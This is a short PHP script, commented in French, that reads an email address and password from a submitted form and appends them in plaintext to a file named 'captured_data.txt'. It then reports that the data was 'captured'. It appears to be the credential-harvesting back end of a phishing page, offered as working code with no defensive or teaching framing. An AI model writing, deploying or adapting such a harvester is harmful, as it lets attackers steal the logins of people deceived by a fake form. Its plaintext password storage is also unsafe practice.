<?php
// Vérifiez si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données envoyées via POST
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Ouvrir le fichier texte en mode "ajout" (append)
    $file = fopen("captured_data.txt", "a");

    // Vérifiez si le fichier s'est ouvert correctement
    if ($file) {
        // Enregistrer les données dans le fichier avec un format lisible
        $data = "Email: " . $email . "\nMot de passe: " . $password . "\n\n";
        fwrite($file, $data); // Écrire les données dans le fichier

        // Fermer le fichier après l'écriture
        fclose($file);

        // Afficher un message pour l'utilisateur (facultatif)
        echo "Données capturées et enregistrées avec succès.";
    } else {
        echo "Erreur lors de l'ouverture du fichier.";
    }
}
?>
